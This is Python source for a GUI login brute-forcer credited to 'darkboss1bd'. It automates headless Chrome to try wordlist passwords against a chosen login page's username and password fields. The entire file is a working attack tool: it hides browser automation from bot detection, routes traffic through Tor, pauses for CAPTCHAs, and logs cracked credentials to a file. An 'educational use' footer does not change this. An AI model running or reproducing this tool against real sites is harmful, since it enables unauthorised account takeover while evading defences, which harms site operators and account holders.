import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading
import time
import os
import sys
from colorama import Fore, Style, init
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
import logging

# Disable Selenium logging
logging.getLogger('selenium').setLevel(logging.WARNING)

# Initialize colorama
init(autoreset=True)

# ======================
# ASCII BANNER
# ======================
def show_banner():
    banner = f"""
{Fore.RED}╔╦╗┬ ┬┌─┐  ╔═╗┬ ┬┌─┐┬─┐  ╔═╗  ╔╗╔┌─┐┬─┐┬┌─┐┌┐┌┌─┐┬─┐
{Fore.RED} ║ ├─┤├┤   ╠═╝│ │├─┤├┬┘  ╠═╣  ║║║├┤ ├┬┘│├─┤│││├┤ ├┬┘
{Fore.RED} ╩ ┴ ┴└─┘  ╩  └─┘┴ ┴┴└─  ╩ ╩  ╝╚╝└─┘┴└─┴┴ ┴┘└┘└─┘┴└─
{Fore.CYAN}            [!] Advanced Login Bruteforcer v2
{Fore.YELLOW}            [!] Coded by: darkboss1bd
{Fore.GREEN}            [✓] Auto Form Detect + Tor + CAPTCHA Pause
{Style.RESET_ALL}
"""
    for line in banner.strip().split('\n'):
        print(line)
        time.sleep(0.03)

show_banner()

# ======================
# Main Bruteforce Tool
# ======================
class AdvancedBruteforceTool:
    def __init__(self, root):
        self.root = root
        self.root.title("DarkBoss1bd - Advanced Bruteforce Tool v2")
        self.root.geometry("800x700")
        self.root.resizable(False, False)
        self.root.config(bg="#1e1e1e")

        self.running = False
        self.threads = []
        self.results_file = "darkboss1bd_results.txt"
        self.setup_gui()

    def setup_gui(self):
        title = tk.Label(self.root, text="🔥 DarkBoss1bd Advanced Bruteforce Tool 🔥",
                         font=("Consolas", 16, "bold"), fg="#00ff00", bg="#1e1e1e")
        title.pack(pady=10)

        subtitle = tk.Label(self.root, text="Auto Form Detect | Tor Proxy | CAPTCHA Support",
                            font=("Arial", 10), fg="#aaaaaa", bg="#1e1e1e")
        subtitle.pack(pady=5)

        frame = tk.Frame(self.root, bg="#2e2e2e", padx=20, pady=20)
        frame.pack(pady=10, fill="both", expand=True)

        # URL
        tk.Label(frame, text="Target Login URL:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=0, column=0, sticky="w", pady=5)
        self.url_entry = tk.Entry(frame, width=50, font=("Arial", 10), bg="#444", fg="white")
        self.url_entry.grid(row=0, column=1, pady=5)

        # Username
        tk.Label(frame, text="Username:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=1, column=0, sticky="w", pady=5)
        self.username_entry = tk.Entry(frame, width=50, font=("Arial", 10), bg="#444", fg="white")
        self.username_entry.grid(row=1, column=1, pady=5)

        # Wordlist
        tk.Label(frame, text="Password Wordlist:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=2, column=0, sticky="w", pady=5)
        self.wordlist_entry = tk.Entry(frame, width=40, font=("Arial", 10), bg="#444", fg="white", state='readonly')
        self.wordlist_entry.grid(row=2, column=1, pady=5, sticky="w")
        tk.Button(frame, text="Browse", command=self.load_wordlist, bg="#005f87", fg="white").grid(row=2, column=1, sticky="e", padx=10)

        # Success Keyword
        tk.Label(frame, text="Success Keyword:", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=3, column=0, sticky="w", pady=5)
        self.keyword_entry = tk.Entry(frame, width=50, font=("Arial", 10), bg="#444", fg="white")
        self.keyword_entry.insert(0, "dashboard")
        self.keyword_entry.grid(row=3, column=1, pady=5)

        # Threads
        tk.Label(frame, text="Threads (1-10):", font=("Arial", 10), fg="white", bg="#2e2e2e").grid(row=4, column=0, sticky="w", pady=5)
        self.thread_var = tk.StringVar(value="3")
        thread_spinbox = tk.Spinbox(frame, from_=1, to=10, textvariable=self.thread_var, width=10, font=("Arial", 10), bg="#444", fg="white")
        thread_spinbox.grid(row=4, column=1, sticky="w", pady=5)

        # Use Tor
        self.tor_var = tk.BooleanVar()
        tk.Checkbutton(frame, text="Use Tor Proxy (SOCKS5: 9050/9150)", variable=self.tor_var,
                       fg="white", bg="#2e2e2e", selectcolor="#333", font=("Arial", 10)).grid(row=5, column=0, columnspan=2, sticky="w", pady=5)

        # CAPTCHA Note
        tk.Label(frame, text="⚠️ CAPTCHA? Tool will PAUSE for manual solve!", font=("Arial", 9), fg="yellow", bg="#2e2e2e").grid(row=6, column=0, columnspan=2, pady=5)

        # Buttons
        btn_frame = tk.Frame(frame, bg="#2e2e2e")
        btn_frame.grid(row=7, column=0, columnspan=2, pady=15)

        self.start_btn = tk.Button(btn_frame, text="🚀 START ATTACK", command=self.start_attack,
                                   bg="#00aa00", fg="white", font=("Arial", 10, "bold"), width=15)
        self.start_btn.grid(row=0, column=0, padx=10)

        self.stop_btn = tk.Button(btn_frame, text="🛑 STOP", command=self.stop_attack,
                                  bg="#aa0000", fg="white", font=("Arial", 10, "bold"), width=15, state="disabled")
        self.stop_btn.grid(row=0, column=1, padx=10)

        # Log
        log_label = tk.Label(self.root, text="Attack Log:", font=("Arial", 10), fg="white", bg="#1e1e1e")
        log_label.pack(pady=(10, 5))

        self.log_text = tk.Text(self.root, height=12, width=90, bg="#111", fg="#00ff00", font=("Courier", 9))
        self.log_text.pack(padx=20, pady=5)
        self.log_text.config(state="disabled")

        # Footer
        footer = tk.Label(self.root, text="⚠️ For Educational Use Only | CAPTCHA: Manual Solve Required",
                          font=("Arial", 8), fg="#ff5555", bg="#1e1e1e")
        footer.pack(pady=5)

    def log(self, message, color="white"):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")
        print(f"[LOG] {message}")

    def load_wordlist(self):
        file_path = filedialog.askopenfilename(title="Select Wordlist", filetypes=[("Text Files", "*.txt")])
        if file_path:
            self.wordlist_entry.config(state='normal')
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, file_path)
            self.wordlist_entry.config(state='readonly')
            self.log(f"[✓] Loaded wordlist: {os.path.basename(file_path)}", "green")

    def start_attack(self):
        url = self.url_entry.get().strip()
        username = self.username_entry.get().strip()
        wordlist_path = self.wordlist_entry.get().strip()
        keyword = self.keyword_entry.get().strip()
        use_tor = self.tor_var.get()

        try:
            threads = int(self.thread_var.get())
            threads = max(1, min(threads, 10))
        except:
            messagebox.showerror("Error", "Invalid thread count!")
            return

        if not all([url, username, wordlist_path, os.path.exists(wordlist_path)]):
            messagebox.showerror("Error", "Please fill all required fields!")
            return

        self.running = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.log(f"[+] Starting attack on: {url}", "green")
        self.log(f"[+] Using {threads} threads | Tor: {use_tor}", "cyan")

        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read wordlist: {e}")
            self.stop_attack()
            return

        chunk_size = len(passwords) // threads
        for i in range(threads):
            start = i * chunk_size
            end = len(passwords) if i == threads - 1 else (i + 1) * chunk_size
            thread_passwords = passwords[start:end]
            thread = threading.Thread(target=self.worker, args=(url, username, thread_passwords, keyword, use_tor))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

    def worker(self, url, username, passwords, keyword, use_tor):
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)

        # Tor Proxy (SOCKS5)
        if use_tor:
            chrome_options.add_argument('--proxy-server=socks5://127.0.0.1:9050')  # Or 9150

        try:
            driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false});")
        except Exception as e:
            self.log(f"[❌] Driver init failed: {e}", "red")
            return

        try:
            driver.get(url)
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            # Auto detect input fields
            try:
                user_field = driver.find_element(By.XPATH, "//input[@type='text' or @name='username' or @id='username' or @name='login']")
                pass_field = driver.find_element(By.XPATH, "//input[@type='password']")
            except NoSuchElementException:
                self.log("[⚠️] Could not auto-detect login fields!", "yellow")
                return

            self.log(f"[✓] Form detected for thread.", "green")

            for password in passwords:
                if not self.running:
                    break

                try:
                    user_field.clear()
                    user_field.send_keys(username)
                    pass_field.clear()
                    pass_field.send_keys(password)

                    # Check for CAPTCHA
                    captcha = driver.find_elements(By.XPATH, "//*[contains(text(), 'Captcha') or contains(@src, 'captcha')]")
                    if captcha:
                        self.log(f"[🛑 CAPTCHA DETECTED] Manual solve needed for: {username}:{password}", "yellow")
                        driver.set_window_size(800, 600)
                        driver.save_screenshot(f"captcha_{username}.png")
                        messagebox.showwarning("CAPTCHA", f"CAPTCHA found! Solve it manually in background. Screenshot saved.")
                        time.sleep(15)  # Give user time to solve

                    # Find and click login button
                    login_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Login') or contains(text(), 'Sign In')]")
                    if login_btns:
                        login_btns[0].click()
                    else:
                        pass_field.submit()

                    # Wait for response
                    WebDriverWait(driver, 5).until(EC.url_contains(keyword.lower()) or EC.text_of_element_located((By.TAG_NAME, "body"), keyword))

                    body_text = driver.find_element(By.TAG_NAME, "body").text
                    if keyword.lower() in body_text.lower():
                        result = f"[🎉 SUCCESS] {username}:{password}"
                        self.log(result, "green")
                        with open(self.results_file, "a") as f:
                            f.write(result + "\n")
                        self.running = False
                        self.stop_attack()
                        messagebox.showinfo("Cracked!", f"Password found: {password}")
                        break
                    else:
                        self.log(f"[✗ FAIL] {username}:{password}", "red")
                        with open(self.results_file, "a") as f:
                            f.write(f"[FAIL] {username}:{password}\n")

                except TimeoutException:
                    self.log(f"[⚠️] Timeout for: {password}", "yellow")
                except Exception as e:
                    self.log(f"[❌] Error with {password}: {str(e)}", "red")

        finally:
            driver.quit()

    def stop_attack(self):
        self.running = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log("[🛑] Attack stopped.", "yellow")

# ======================
# Run App
# ======================
if __name__ == "__main__":
    root = tk.Tk()
    app = AdvancedBruteforceTool(root)
    root.mainloop()